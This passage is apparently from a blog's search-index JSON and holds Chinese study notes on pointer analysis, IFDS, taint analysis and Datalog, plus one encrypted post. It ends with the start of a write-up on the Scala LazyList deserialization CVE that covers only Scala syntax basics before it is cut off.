overlap，就认为他俩可能是同一个container，就在arg和lhs加一条edge,这里的rv是recive variable\n也就是在上面的例子中，\nline3中 的add的receiver variable是$pt_{H}$(l1)，line4的receiver variable也是ptH(l1)，因此就加一条shortcut edge，从a–&gt;x，类似的从b到y也加一个\n\n对应上面的Iterator来说，因为ptH(it1）&#x3D; pth(l1)&#x3D; {o1}，所以在l1和It1上加一条边\nHandling of Host-Dependent Objects.\n规则和前面一样，还是cut掉从exit到 $Exit_{cs}^{lhs}$的边，并且添加一个shortcut edge 从entrance arg到exit lhs\n\n不同的地方是要扩展entrance、exit和pth\n\n\n扩展exit\n\n现在认为next()就是exit\n\n扩展pth：\nhost-related pointer：Hptr，理解成Line 11 的it1   作为key\nhost object：H 理解成object o1\t\t\t\t\t\t\t作为value\nQ1：那如何通过Key获取value？\nTransfer methods：\n\niterator依赖于一个container，把container称为host，把iterator object称为host-dependent object\n\n如果一个host-dependent object是通过调用host H的类的方法m创建的，那么m称为一个Transfer。\n\n\nLine11的iterator()就是一个transfer method，it1就是Hptr指向的对象\n对于每个transfer的call site\n\n把receiver variable的host object传给LHS variable，也就是把o1传给ptH(it1)\n\n\nLocal Flow Pattern\nFormlism and soundnessPointer Analysis with cut-shortcut\n\n定义了指针分析的rules，大体上和之前学的都相同\ns–&gt;t表明s指向的t也指向，就是把s的指针集加到t中，所以也用了pt(s) 包含于 pt(t)这种表达\n\n对于Cut-Shortcut，定义下面三个集合：\n\ncutStores：是store statement的集合，如果一个 store statement j 在cutStore中，j生成的store edge就会被cut off\ncutReturns：是return variables的集合。如果一个return variable $m_{ret}$在cutReturns中，从$m_{ret}$到m的call site的LHS variable会被cut\n*$E_{SC}$*是shortcut edgs的集合。如果一个边 s –&gt;t加到$E_{SC}$中，就会被加到PFG中，那s指向的对象也会被t指向\n\nField  Access Pattern\nHandling of StoreARG2VAR\n\n方法m的形参是 $m_{pk}&#x3D;x$，方法中x没有被重定义\n把实参传递给x\n\nCutStore\n\nx和y都是从形参(形参也是从调用点的实参获得的)中获得的参数，且有i这样的statement\n\n如果i在cutStores中，就把\n\n\n\n\n。\nthis.f&#x3D;p 属于cutStore，  a1.f&#x3D;p — &gt;  a1.f &#x3D; t1\no8属于pt(a1)   从t1到08.f加一条边\n看一下这个rules：\n\n当不再有 ARG2VAR，也就是不再有参数传递，说明已经到顶了\n就加边\n\n\n\n\nhandling of Load根据上面的规则\n\n方法getItem包括r\nthis是方法getItem的参数\nr是返回值\n\n作者的idea是cut off 方法m的return edges\n\n首先找到一个statement：x&#x3D;y.f\ny的值是方法m的参数，并且没有重定义\nx是m方法的返回值\n\n\ncut off return edges，从方法m到接收变量的这个边被cut掉\n\n对于上图的结果就是，cut掉r到result1，和r到result2，加一个o15.item到result1，和o20.item到result2 \n\n\n就对着前面的定义理解就行了，挺好理解\n\n\n有可能方法中有黄色部分的两条语句，那为了保证这种情况也能满足，就定义了RelayEdge。\n\n\n\nContainer Access Pattern\n\n\nCutContainer：cut掉所有return edege，来自exit 的method\nShortcutContainer：添加边\nhost是container l1\no1属于pth（l1） 把参数传给\nHostSource和HostTarget就是在做Handing of Containers\nTransferHost：这个就是上面讲的transfermethod，比如对于\nit = l.iterator()\n\n也就是把pth(l) 给it\nCOLHOST：Collection包括 list set queue deque\n它在处理ArrayList l1 = new ArrayList() ，把o1给pth(o1)。\n\n这个我没太看懂\nLocal Flow PatternEvaluation用doop和Tai-e实现了上面这些rules。\n作者选取的精度指标是\ncast-resolution analysis：the number of casts that may fail—#fail-cast\n a method reachability analysis：the number of reachable methods—#reach-mtd\t\na devirtualization analysis: the number of virtual call sites that cannot be disambiguated into monomorphic calls  无法将代码中的调用区分为单态调用。  也就是当存在多个重载的方法时，找不到具体的方法\na call-graph building analysis ：the number of call graph edges\nSoundness（Recall）\n\n这里我理解指针分析的Recall就是正确识别所有可用的指针的能力\n\n作者又对不同的大型程序，分析了方法的效率。\n总结\n感觉大佬写的文章确实好，在学了课之后，有些地方很容易懂\n接下来看一下Tai-e的那篇文章，复现一下论文的代码\n\n","slug":"Context-Sensitivity-without-Contexts-PLDI23","date":"2023-10-08T05:40:18.000Z","categories_index":"","tags_index":"Program Analysis,论文","author_index":"XyM4ster"},{"id":"280fda85aebd83efe2030df16a32f5ff","title":"bottomupcs","content":"\n  165d50f05814027fb7fe5e4ae8a088d8cabf1ea2d88ccf0f53dc7b0b289f333341828fd88b2557819d802f94103d3ae533a248f976fe4b8635c776fc2c174c3bf94982f99e89821d0b7a0b8248972d15294175d6f52be234cf3fa9cae020470722e187865044c2ad1bbc46e6470ff95e03f8bdf4f8a7b177df17890cc4d7c9daac5071df9ff7f7adeceb8fdd764b5cc14989eac14430c91a4439e4967b927463afedfbf934c9fa3a5700d893337da5687c20c0e7e5a4f43fb1e44ba9f8d69c5fbfae5a88ad5e2aefde68a0ad1422614835e8c434734c29be89aa21136ee50c0fec0858bd6418ef6f5846c32daa9a6352525163cac83dd885efbd0d8a9b58754025df413c147b64b95a2a8682c977706360f96b83b2e56418e4d20c6046555e606c559699afcf8a5528529500461293fe846d5957a8d6dd98208470620df2a898e7e3e2110bb3de430951c7bf3ba4ce56136044450f4e2bd961f917db2a0662365f63b27cabc682548499361299b320e453c749294cef2b2c4a6366cf92ea75c4b4e8d1d0339a29d75808a96a7d065bc10b6d3d822791ac0b584af26b0e2bc09ceefa63903365358803b47b89ea1fd065501ee78e5b39a845afe9e4103b0a48998fe632260f9e2530218730a48fef7125209ad8684e6a5a451f5fd551cde0464fddf10666c3935cdd1f161fae2e2c998c7a577b834266666b555633d86b47a0863d8be6d0106a25f9011bce57e73b60a7de2b297c269090535b85b5435666a3432c4909fce1720c72a740a086c621364a20c655b6e88b9ce99927e3d9103a03c0c5ca5d00e67076892078f93c6bf23b37296c4fdb9a8240ed27e05841a9c129670a49cee62675728b7adb2befc03dedbd8e53ee4f87d0cb57c4393c0507001199a02867d4d756bc8465a98b02f09aa88cd3fb68a03104c3e2b9733c1b97f787b23c5959b9a294ae153e6f23f3bb21cb75c6b71429bbf99e7509c239eba0a5c21f44d6160e0581a6a31cccbc888597f277aa5c39aed7b3767b0f5a0ada7add51e12d9ca45031d20c7df7a6f2e0fe46eac547e6f2dde9b9cc514416aa38114ced28c3440f5ec76f2ab92a850666c24134d43fae00ba0f989f2f39fdbd9d7bd360889aaed8e6ce1fe81a14142b487ca0458de84b3dd9f7de1a0562d3771402a3681332641997c78812820fc741e225623d1d10dfa4ed3c6fb551a7135f5030e1103a82b23763378ef9aaf668cc06c7b9b2c37007a232efff8357325e9ac2d66d78b3ed79e81fa08cad31820c84041b3dc39708ab8fe7529f45f0f7952e69ab879a92cee09693c3d0f12b616fa081ec8b96a1bbe5724767e355b13fbecabef00d53e68354c03042b91fd9444bb9eea0db7d4f7e1a1ae05de6b4187290d162521556de47f2568da915d9e0785d7c0913ff98623e17fedef4fd13b4424ececbb9e44eae73d7e2c422b373a854ec77edf34acf22d884f9a2a53e16793ab7ded37c99c4ab88d2dc766ba3c083cc2cf3a9cc9ca4c0d883dad57d4d7c837f649c940b2c2a50e192118d5403e78e319d876cd6f975131d44d71bd143df36002493c31c32fa1215889f081a08f005e0d8f72f982fc44159dcd700f58e29051ea6ae832de378681ef9655d767c6c013342f6fa38bb0db6da1607f7f16826252cebf59211d8947262b60a16d2dc016f7500dd8547c74e3a865fe64e49ab24eeae1be6eb4424efd2ef42b1407063155579483e6f2ce8927cf4709a4765593f7e61785238bb704dbf51441c93c7767beddd2d2ef94c6acd7f2000e7506aabd313e4ac9506abca9bee854ec5be0041cea84fcc1d97f667f3573ce4a3e5fb2a29ee0884d1a77448642f53f8fbba7d789c483993d8e83bce7e935776d9e0a476ca5be87ecc3c7bceabedc197a4d58297409ccc7a650f087b22f159fa492de09fc516bacd9d51055de02821fdd6a4217698fa9749a1190fb27cbada6eda77f9178e3d68c1e6e675130a0dfb28ae920285d22d723e1a89ef0dc429e74fb7159ed5cb36941998046965cc790e55b821b45f9284378e8dd48bf61961b0b138fe96913bdc17c22bd2911582ed000773bf4abf53a7f48b7a5ea31f634ede159c2df97428dbaf566f4696ae589937808cf58d7c36a820809f613243a619fab91a672384ed2cf4589705f885b61f3a4f4ef3bc7e3c064aa3262347694b8511f92d937dd9df479ccd8bb40f4a686231c9d6d49ba6e5a0cd9424079653ccf568e84b46f684e59f58f161c2e33a710b02a426b79746f8e2244860b791f425dbb9a01f6d28f0f1db88ac0b4be59fcf4d4d4acd40efc224b2009325626b7ba0921cc7ac544b50d9f0148dfd52cfcadd0f675354adeba67ebe74fa2dc7adbfb5c4ea20cb873c6b348518ec087867e470b1a8548c82e4edb71bd52bea9c13ddc5cb99088a34ea020954d8fa5b619f3dc44ac621d58b20c1cbc1e3904ae072939da43c9715574245a34df5580b89fc919d41708079ebaeaffa9fefe675f068a75f3d0b2ea9c98ef11745170794719ac4f49ddd7199078b4dc4c2013f7d92a0325b9cb5f733a99dc67f3ed82febdf433878f1f51a2c44250bdd36cb03a947061026c4a742e6ff9e70516e60799acb4455edfa570b28eae42e5b3192cf9d91c09426029f1810727333d22c6f1ddc3fe96b2d72420a193a4368e0303c20e382aadad4c77f76cfcca85ca0e277522958ac347e98693196bd616a49548a1f43840ca917322c8bff7900c11b7a23891b84c5cc317614b6833ed2bfe077fae9cf2cab54f5b8b531109aeea4237cfeffdc38a9a31ef85d00dde84fbe0f3eff9c7b849ba14b187194442d1645f59bddb4e77d5b224021c267644d7bcd19ef5f3689f76fce6d80\n  \n    \n      \n      \n        Hey, password is required here.\n      \n    \n  \n\n","slug":"bottomupcs","date":"2023-09-20T08:43:17.000Z","categories_index":"","tags_index":"","author_index":"XyM4ster"},{"id":"f34c0862e405e67688bc815c83cfd9aa","title":"Program-Analysis-05","content":"CFL-Reachability and IFDSInfeasible Paths：\n\nPFG中不会被执行的边\n\n给定一个path，在静态时无法判断一条path是不是假边\n\n根据语义，age是年龄，那就一定大于0，所以右边这条红色的一定不会被执行。这样的path是infeasible path。\n\n\n考虑上下文不敏感的情况，那x 和y的结果会有-1。\n\n指针分析中最右边走r的路径仍然不可避免。\n\n但是因为上下文不敏感导致错误的返回是可以避免的\n\n\nRealizable Paths\nRealizable Paths：return应该和相应的call匹配\n\nRealizable path可能不会被执行，但是unealizable path应该一定不能被执行(也就是从1的call进来，不能从2的return出去)\n\n因此现在的目标就变成了找到Realizable path\n那如何找呢？\nCFL-Reachability\nCFL-Reachability(context free language)Context-free grammar(CFG)CFG是形式语言的描述方法，CFG 中的产生式规则由两部分组成：一个非终结符和一个由终结符和非终结符组成的符号串\n​\t\t$S-&gt;\\alpha$\nS表示非终结符，$\\alpha$表示终结符或者非终结符，或者空。\n\nCFL-Reachability用括号匹配的方式完成上面提出的问题，实现每一个call都对应它的return。\n\n通过CFL进行括号匹配\n\n每个右括号都要有一个左括号，但是不是每一个左括号都有一个右括号\n因为前面表示return要有对应的call，先有了左括号，才会有右括号的事。但是不是有左括号，就一定有右括号，因为可能程序还没有执行到return。\n\n\n每个call site i，call edge是 (i，return edge 是)i，给每个edge都加了一个Label，也就是括号\n\n\nA path是一个realizable path，如果path的word在Language L中。\n推导这个匹配的过程\n对于realizable\n\n对于1，realizable -&gt; matched realizable，mathed就是已经匹配的，对应1中的绿色部分\n第一个式子，就是个递归，realizable -&gt; $(_i realizable$,也就可以匹配多个单括号的情况，也就是2\n\n对于matched：\n\nmatched 可以是一个e，也就是对应3  的情况\n也可以是一个$\\varepsilon$，就是很多很多e\n最后这个matched matched对应4的情况\n\n\n\n应用上面的规则，左边就是realizable path，右边就不是realizable path\n\nIFDSA Program Analysis Framework via Graph Reachablity\n\n通过图可达性进行程序分析\n\n\nIFDS是interprocedural,Finite,Distributive, Subset Problem\n\ninterprocedural：全程序分析\n\nFinite： domain是finite\n\ndistributive：分发的\n\n\nIFDS提供了MRP solution。\nMeet-Over-All-Realizable-Paths（MRP）\n\nMOP是所有边都应用transfer function\nMRP是只对realizable path应用transfer funciton\n\nOverview of IFDS\n是一个程序分析框架\n给定一个程序P，和一个分析问题Q\n\n构建一个supergraph，理解成前面讲的ICFG，并且定义了flow function，也就是图1中蓝色的部分\n构建一个**exploded supergraph **G#，把flow function转换成了representation relations\n最后在G#上遍历，解决Q\n\n最后，n是一个program point，d属于MRP，如果有一个realizable path在G#中，从S的main方法到n\nSupergraph\nG*代表supergrah\n\nG*是一个collection，包括所有的G1,G2\n每个Gp都有一个start node 和一个exit node\n把call方法变成了一个call node 和一个return site node\n\n\n这里有3种边\n\nintraprocedural call-return edge：紫色部分\ncall-to-start edge：绿色边\nexit-to-return edge：蓝色边\n\nDesign Flow Functions$\\lambda$-expressions\n\n\n是一个匿名函数\n$\\lambda e_{pardam}.e_{body}$,第一个是参数，第二个是Body\n($\\lambda x.x+1$)3，表示执行这个函数，输出就是4\n\ndesign flow functions\n目标是：判断是否被初始化\n认为未初始化是sound的。都假定未初始化都是1。\n\n\n程序中定义了x,g两个变量\n因为x已经被初始化了，把它从S中除去\n进入方法，所有的x由a替换\ng被初始化\na-g的结果取决于，a和g两个，如果a和g中有一个没被初始化，a就没被初始化，加到S中，否则被出池化\n程序最后出来减去a\n\n红框的内容，对应之前学的为什么要有call–&gt;return的边。\n\n\n因为要传Local variable，在这里也就是传g\n\n如果这里直接是$\\lambda S.S$，它也一定是sound的，你就认为它没初始化\n\n为什么要减去g呢？\n\n首先程序是may analysis，也就是有一条边初始化了，就认为是初始化了，所以merge处是**+**\n那这里减去g就表示现在$\\lambda S.S$里面没有g，那最后有没有g完全由方法p决定，因为结果是+。方法里说定义了就是定义了，没定义就是没定义。\n如果不减，就默认，S中有g，一定会传下去，那就是不准的，因为并不知道会不会传下去。\n\n关键点在于这个Merge的结果是什么。\n\n\nBuild Exploded Supergraph关于must analysis 和 may analysis的理解终极版\n\n\n\nReaching Definitons\nLive avaliable analysis\navaliable expressions analysis\n变量是否初始化分析\n\n\n\nmust&#x2F;may analysis\nmay analysis\nmay analysis\nmust analysis\nmay analysis\n\n\nunsafe的情况\n所有变量都不能到达\n所有变量都不活跃\n所有表达式都可用\n所有变量都未初始化\n\n\nsafe but useful\n所有变量均可到达\n所有变量都活跃\n所有表达式都不可用\n所有变量都初始化\n\n\n目标\n找到未到达的变量，进行替换\n找到不活跃的变量进行替换\n对可用的表达式进行替换\n对未初始化的变量进行替换\n\n\n初始化(对应unsafe)\n0\n0\n1\n0\n\n\n关于sound：\n\n大于目标的就是sound，那目标是找到不活跃的变量，所以sound就是所有的都不活跃。\n程序从unsafe也就是sound向safe分析。\nQ1：第一步是判断是must analysis，还是May analysis\n根据定义判断，有意义和无意义的结果要满足sound，&#x3D;&#x3D;是希望找到尽可能多的safe的结果&#x3D;&#x3D;，根据上面的may analysis view，分析从unsafe –&gt;safe，其实这里可以看出unsafe 就是sound\n\nReaching Definitions：定义是判断$D_i$是否有意义。也就是一条路径如果有意义，没有重新definitions，那就是有意义，所以是may analysis，对于Reaching Definitions，\nLive variables：一条路径用了这个变量，那就是有意义    \n目标是找到不活跃的变量。\n假设所有变量都不活跃。\n\n\navaliable expressions：判断表达式是否可以被替换，也就是如果所有路径都算了，那就可以被替换。所以是must analysis\nconstant propogate：所有路径都是一样的，才是常量，所以是must analysis\n\nQ2：根据must(may) analysis，定义merge处是乘法(加法)\n\nReaching Definitions：加法\nLive variables：加法\navaliable expressions：乘法\nconstan propogate：乘法\n\nQ3：关于初始化什么定义成1，什么定义成0\n其实加法，显然应该全部初始化为0，目标是获得1.\n乘法全部初始化为1,目标是获得0。\n\n为什么红框处是$\\lambda S.S-{g}$，而不是$\\lambda S.S$？\n首先这个流程的最后结果会得到一个集合$\\lambda S.S$，而该集合是未定义变量的集合。这里和之前的May analysis的分析不太一样，我们之前得到的safe结果是活跃的变量的集合(定义的集合)。\n\n按照老师的理解：\n\n由于是may analysis，\n\n如果call返回的结果是未定义，那么$\\lambda S.S$中就会有g，会流出来，由于call-to-return边没有让g流出来，最后会流到下面。\n如果call返回的结果是定义了，也就是g不会流出来，而call-to-return边没有让g流出来，最后就不会流到下面。\n综上，结果正确。\n\n而如果该边是$\\lambda S.S$,最后结果无论怎样都认为g是未定义的，显然结果是不准的。\n\n按照正规我前面总结的表格分析：\n\n由于是may analysis，目标是让定义的变量尽可能的多，所以该边是$\\lambda S.S-{g}$\n\n按照我的理解：\n\n按照正规来说，这里应该定义未初始化的变量为0，初始化的变量为1。\n那么最后获得的集合，其实是一个定义变量的集合。\n也就和上图表示的不一样，上图获得的是一个定义变量的集合。\n\n按照上图定义1和0：\n\n如果按照上图来定义，那应该定义未初始化的变量为1，初始化的变量为0，此时最终获得的是未初始化的变量集合。\n","slug":"Program-Analysis-05","date":"2023-09-16T13:35:49.000Z","categories_index":"","tags_index":"Program Analysis","author_index":"XyM4ster"},{"id":"0c7c1359362e7af148487a65d7d4a6f0","title":"Program-Analysis-04","content":"Static Analysis for securityInformation Flow Security目标\n\n避免不想要的信息流\n\nAccess Control vs. Information Flow SecurityAccess Control\n\n检查程序是否有权限\n关心信息是如何访问的\n\nInformation flow security\n\n可以追踪信息的流动\n关心信息是如何传播的\n\nInformation Flow\n\n和前面学的一样，箭头表示信息的流动\n\nInformation Flow security\n定义程序中的变量不同的安全等级\n\nSecurity Levels\nH : 就是hight security，保密信息\nL : 就是low security，公开的可观察到的信息\n\n安全等级用lattice进行抽象：L&lt;&#x3D; H\nInformation Flow Policy下面是**J. A. Goguen and J. Meseguer, “Security policies and security models”. S&amp;P 1982.*论文中提出的policy\n限制信息在不同的security level之间如何流动\nNoninterference policy：非干涉\n\nhigh variables 不能影响 low variables的信息\n也就是说不能通过观测low variables的信息来推测出high variables中的信息\n\nNoninterference policy example\n\n\n上面红色的是不允许的，因为high variables流到了low variables\n\nConfidentiality and Integrity（保密性和完整性）保密性：防止信息流出去\n完整性：防止其他信息流进来，造成污染，污染了信息就不完整了\n\nIntegrity涉及到了很多外部数据的注入，违反数据的完整性，CTF中常用的方法\n\nCommand injection\nSQL inhecttion\nXss\n\nConfidentiality and Integrity\nIntegrity 更广泛的定义\n准确性：保护数据不被污染\n完全性：对于数据库系统，防止数据丢失\n一致性：对于文件传输系统，发送方和接收方需要是一样的\n\nExplict Flows and Covert Channels（显示流和隐藏信道）\n前面这种直接赋值的方式就是显示流\n\n对于这个程序，我们可以通过public来判断secret是否大于0，这就有了信息的流动，这种就是implicit flow隐式流。\nDoes Secret Information Leak？\n第二个可以通过执行时间判断，secret &lt; 0，会稳定的增加程序的执行时间\n最后一个如果secret 小于0，一定会爆出数组越界，所以也是会泄露信息。\nConvert&#x2F;Hidden Channels\n隐藏信道意思就是他的最初的目的不是为了传递信息，这种叫隐藏信道\n\n\nExplicit Flows and Convert Channels\n\n对于显示流，一下子泄露的是32bits的信息，但是对于隐式流，只是泄露1bit的信息\n所以现在集中于如何避免这些不想要的信息流，就是不让他胡乱传播。\n\nTaint Analysis(污点分析)把程序中的数据标记成两种：\n\n对于感兴趣的数据，给他打上标签，叫做污点数据\n其他的数据，叫非污点的数据\n\n污点数据的源是source，实际上，通常污点数据来自于一些方法的返回值\n污点分析就是追踪数据如何流动的，把它流到的位置叫sink，实际上sink通常是一些敏感的方法\nTaint Analysis ：Two Applications\n保护保密性：\n\nSource：secret data的source\nSink：泄露的地方\n针对Information leaks问题\n\n保护完整性：\n\nSource：不可信的数据source\nSink：critical computation(关键计算)\n针对Injection erros\n\nTaint Analysis and Pointer Analysis, Together*\n污点分析关注的问题是污点数据能否流到sink处？\n换种方式就是，sink的指针是否指向tainted data？\n\n！！！这不就来了么，这不就和前面学的指针分析非常非常像！\n\n隐藏内容\n污点分析关注污点数据在程序中如何流动\n指针分析关注抽象的对象在程序中如何流动\n\n\n那怎么做呢，如何结合呢？\n\n把污点数据当成是特殊的object\n把source当成是allocation sites\n利用指针分析去传播污点数据\n\nDomains and Notations\n这里以C.I.为例，结合指针分析和污点分析\n\n在域中新加入了Tainted data，污点数据\nti表示call site i 的tainted data\n\nTaint Analysis：Inputs &amp; OutputsInputs：\n\nSources：a set of source methods（调用返回污点数据的方法）\nSinks：a set of sink methods（污点数据流到的违反了security polices的方法）\n\nOutputs：\n\nTaintFlows：一系列污点数据的集合和sink 方法\n\n 例如&lt;ti,m&gt;属于TaintFlows，表明来自调用点i(source method)的污点数据可能流到sink method m\nRules：Call处理source\n\n这里的l理解成调用点，m理解成调用的目标方法，如果目标方法是Source，就把tl加到r的指针集中\n\n\nRules：Same As Pointer Analysis处理传播\n\nRules：Call\n处理Sink\n\n从CAll graph中取出目标方法\n如果目标方法属于Sink，如果参数中有污点数据，就把他加到TaintFlows\n\nAn Example\n\n因为认为getPassword是一个Sink，所以根据Rule，会把t3加入到pw的指针集中\n\n对于第七行log，因为log是一个sink方法，所以会检查他的参数s,s指向t3，而t3是一个污点的数据，在pw的指针集中。\n\n所以把&lt;t3,log(String)&gt;加入到TainfFlows中，表示t3这个污点数据会流到log(String)方法中，会泄露出去。也可以通过PFG发现整个泄露的流程\n但是指针分析也有处理不了的方法，比如这个”+”，append方法，就没法处理\n\n\n\n\nDatalog-Based Program AnalysisMotivationImperative vs Declarative(命名式 vs 声明式)\nImperative：怎么做，java c++都是命名式语言\n\n\nDeclarative：做什么，SQL，声明式语言\n\n\n\n\n隐藏内容\n命令式语言是一种以明确的指令序列来描述计算步骤的编程范式。程序员需要指定计算机执行的具体步骤和顺序。在命令式语言中，程序的执行顺序对程序的行为至关重要。\n相比之下，声明式语言更关注描述问题的解决方法，而不是明确的计算步骤。声明式语言将问题定义为需要解决的目标，而不指定如何实现这个目标。常见的声明式语言包括逻辑编程语言（如Prolog）和函数式编程语言（如Haskell）。\n\n\nPointer Analysis Imperative Implementation 如果要用命名式的语言实现指针分析，也就是具体的写一个代码，需要非常多细节的东西。\nPointer Analysis Declarative Implementation\n如果用datalog，就会很简单\n\nDatalog\n是一种声明式的逻辑程序语言\n\n\n\n没有赋值\n没有控制流\n没有函数\n不是图灵完备的\n\nPredicates(Data) 谓词\nDatalog中，Predicates 位词（也可以叫relation）是一些列陈述的集合\n谓词是a table of data\n一个 fact 就是一个table中的一个tuple(元组)，通俗说就是属于这个表中的一条数据\n\n\n\n显然根据这个例子，Xiaoming,18是一个fact，Abao,23不是一个fact\n\nAtoms（元值，最小不可切分的一部分）\nAtoms是Datalog中基本的元素，Atoms是Datalog的predicate\n\n\n\nTerms\n可以说变量：代表任意一个值 ，Age(person,age)\n也可以是常量 ，Age(“Xiaoming”,18)\n\n\n\nP(X1,X2,…,Xn)是relational atom(关系型元词)\nAge(“Xiaoming”,18)就是relational atom(关系型元词)\n除了关系型元词，还有算数型元词\n\nage &gt;&#x3D; 18\n\nDatalog Rules(Logic)\nRule是表示逻辑推理的方法\n\nRule也用来具体说明fact是如何推断出来的\n\nrule的形式是：\n\n\n这里意味着从Body推出head，如果body是真的，那么head是真的\n\n这里的逗号看成逻辑与\n\n\nInterpretation of Datalog Rules\n考虑子目标中所有可能的组合\n如果一个组合让所有的subgoals都是true，那这个head astom也是真的\n这个head的predicate包含了所有的true astorm\n\n\n对于一个Datalog program，就是Facts + Rules\n\n问题：那最开始的fact咋来的呢？\nEDB and IDB Predicatesdatalog中提供了2种谓词\n\nEDB（Extensional database 外部数据库）\n谓词是最开始被定义的\nrelations是可以枚举的\n看成是input relations，因为是输入的，所以不需要经过推理\n\n\nIDB（intensional database ）\n谓词是通过rules建立的\nrelations是由规则判断的\n能被看成是输出的relations，通过rules推导出来的\n\n\n\n\nLogical OrDatalog中有两种表达Logical or的方式\n\n在头部写多个Rules\n\n\n\n使用逻辑 or 操作符 分号 ; \n\n\n\n逻辑or的优先级比逻辑与and低\nNegation(逻辑非)\n\n\n对于计算补考的学生，就用Student(student),!PassedStd(student)\n\nRecursion\nDatalog支持递归的规则\n这也就意味着IDB predicate能从它自身推断出来\n\n\n例如，我们可以通过递归的规则计算图的可达性\n\n\n\n已知Edge(a,b)是从a到b之间有一条边，Reach(a,b)是从a可以到b\n那么可以推导出Reach(from,to)，从from到node可达，且从node到to之间有一条边，那么从from到to就可达\n\n有了递归的好处在于\n\n如果没有，就像sql一样，只能表达基本的查询\nselect from  where\n\nRule Safety\n对于这两个rules，B(y)可以理解成在B中\n\n首先左边满足B,且x &gt;y，但是并没有限制x，所以会穷举所有的x，所以是无穷的\n对于右边的，同样是无穷的\n\n这种情况下，会让A也是无穷的，Datalog一直在计算\nDatalog规定的规则：\n\nA rule是safe当每个变量至少出现在一个non-nagated relations atom中。就是不出现在非中\n因为非是一个无穷的集合，所以要不出现在非中\n\n\n上面两个rules是safe\ndatalog只允许写下安全的rules\n\nRecursion and Negation\n在这个例子中，如果B(1)是true，\n\n假设A(1)是false，这又推导出A(1)是true。\n\n假设A(1)是false, A(1)又是true\n\n\n所以这互相矛盾。\n因此，Datalog中，递归和一个atom的非必须是分开的。\nExecution of Datalog Programs\n\n通过输入EDB和Rules，在datalog engine中，直到没有新的IDB生成\n单调性：只会有越来越多的facts，facts不会被删除\n一定会终止：\n因为是单调的\n根据rule safety，是不允许它一直递归下去的\n\n\n\nPointer Analysis via DatalogEDB：指针分析中的EDB就是指针相关的信息\nIDB：指针分析的结果\nRules:指针分析的rules\n\nAn Example形成EDB\n把程序变成谓词\n\n\nDatalog Rules for Pointer Analysis\n\n红色表示已知的，蓝色表示推导出的结果\n这就可以看出用datalog实现pointer analysis十分的简洁\n\n具体实现(算法)\n\n首先判断符合new的语句，枚举表中的所有情况，在varPointsTo中添加，b o1 ,c o3\n\n\n\n应用assign的规则\n\n\n\n应用store：\n\n\n\n应用load\n\n\n根据已有fact，应用rules，得到更多的fact,实际执行时候是不断迭代的，有新的rules能调用，就调用，并不是上面写的算法的过程。\nHandle method calls\nThisVar：存在是this指针，m就是方法，this就是变量\n由于方法调用是做4件事，这里也是在做4件事，这里用了3个rule\n第一个Rule:Dispatch，传this\n\nEDB:\n\n首先是一个virtucal call，l：表示调用点，也是Label，x是变量，k是方法\nVarPointsTo表示x指向oi\n利用Dispatch表，找到了目标方法m\n根据ThisVar表，得到了this\n\nIDB：\n根据上面的输入，得到了\n\n传this，也就是this也指向o\n把m方法加到Reachable中\n\n第二个Rule：传参数\nArgument：l是调用点,i表示第几个，下标，,a实参\nParameter：m是放，i表示第几个，下标，p形参\n\n第三个Rule：传返回值\n\n\n根据CallGraph获取方法m\n获取m方法的返回值\n获取返回值的指针\n获取接收的方法，把o传给接收的方法\n\n对于全程序的指针分析\n\n入口方法一定是可达的，所以要加一个EntryMethod\n\n对于new，要加一个Reachable，只有方法可达，才处理\n\n\n那为什么只有new加了Reachable呢？\n\n因为其他方法都有VarPointsTo，如果方法不可达，那VarPointsTo肯定为假，所以也就不会触发相关的load store语句\n\nTaint Analysis via Datalog\n在指针分析的基础上\n\n需要Source\n需要Sink\nTaint：关联每个call site到污点数据的call site\n\nIDB predicate\n\nTaintFlow(t:T, m : M )表示t这个污点数据会流到sink method m处\n\nHandle Sources and Sinks\nHandle sources：\n\nCallGraph：l , m\n现在告诉我m是个Source方法\n接收变量是r\nTaint告诉我现在在l 处产生了一个污点数据t\n因此把r 指向t\n\n\n\n取出调用边\n现在m方法的第i个参数是个Sink\n取出第i个的实参\n取出它的指针集\n从Taint中取出它的label  j \n推导出从j处来的可能流到l调用点处的第i个参数中。\n\n本质上就把EDB理解成表，所以EDB的rules就是在查表，IDB就是通过查表得出来的结论。\n总结优势：\n\n代码可读性很强\n隐藏了很多细节，所以很容易实现\n从优化的引擎中可以获益\n\n缺点：\n\n限制了表达逻辑，有些情况不能表达\n不能完全控制，因为中间是个引擎，是个黑盒子\n\n\n","slug":"Program-Analysis-04","date":"2023-09-09T15:34:02.000Z","categories_index":"","tags_index":"Program Analysis","author_index":"XyM4ster"},{"id":"de8b97b3b30ced078cc1db74c65885b4","title":"Scala_LazyList反序列化漏洞利用","content":"引言\nClick to see more\nSCTF的hello java看了大佬们的wp，完全看不懂。最近的WMCTF，发现很多关于java反序列化的知识,决心要好好学一下java反序列化&#x2F;再回头看这道题，搜索到了大佬的复现博客，赶紧膜拜了一下。\n\n\n参考博客基于LazyList的Scala反序列化漏洞透析(CVE-2022-36944)_小白Lanb0的博客-CSDN博客\n漏洞复现环境GitHub - yarocher&#x2F;lazylist-cve-poc: POC for the CVE-2022-36944 vulnerability exploit\n利用条件\nScala 版本 &lt;2.13.9\n\nScala简介\n这一部分主要是参考上面博客的内容，也有些是我自己的理解\n\nScala运行在Java虚拟机上，并兼容现有的Java程序。Scala源代码被编译成Java字节码，所以它可以运行于JVM之上，并可以调用现有的Java类库\n\nScala可以看成是java的扩展\n\n具有更丰富功能的java\n\n\n匹配器match基本用法// 定义一个值\nval x = ... \n// 使用match对值进行匹配\nx match &#123;\n  // 每个case表示一种匹配情况\n  case 条件1 => 结果1 // 如果x满足条件1，就返回结果1\n  case 条件2 => 结果2 // 如果x满足条件2，就返回结果2\n  ...\n  case _ => 默认结果 // 如果x都不满足上面的条件，就返回默认结果，_表示任意值\n&#125;\n\n\n其他用法// 把match赋值给一个变量\nval result = x match &#123;\n  case 条件1 => 结果1 \n  case 条件2 => 结果2 \n  ...\n&#125;\n\n// 把match作为函数的参数\ndef foo (y: Int) = &#123;\n  println (y)\n&#125;\nfoo (x match &#123;\n  case 条件1 => 结果1 \n  case 条件2 => 结果2 \n  ...\n&#125;)\n\n// 把match作为函数的返回值\ndef bar (z: String): Boolean = z match &#123;\n  case \\\"yes\\\" => true \n  case \\\"no\\\" => false \n  case _ => false \n&#125;\n\n\napply方法当我们用括号传递参数给一个类或者对象时，Scala会自动调用它的apply方法，并把参数传给它。\napply方法定义在伴生对象中// 定义一个类Person，有一个name属性\nclass Person(val name: String)\n\n// 